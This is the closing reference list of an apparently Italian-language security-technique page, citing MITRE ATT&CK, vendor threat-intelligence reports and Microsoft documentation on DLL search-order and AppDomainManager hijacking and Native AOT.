- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 prende di mira governi e infrastrutture critiche del Sud-est asiatico](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Ricostruzione e rilevamento del DLL Search-Order Hijacking di Windows con Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Creazione di librerie native con Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Export nativi con Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Ordine di ricerca delle librerie a collegamento dinamico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Formato PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Alla scoperta di una variante di SectopRAT incorporata in software legittimo](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Il furto di LIGHTSHOW (Parte uno)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operazione FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Framework di caricamento .NET basato su XAML NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
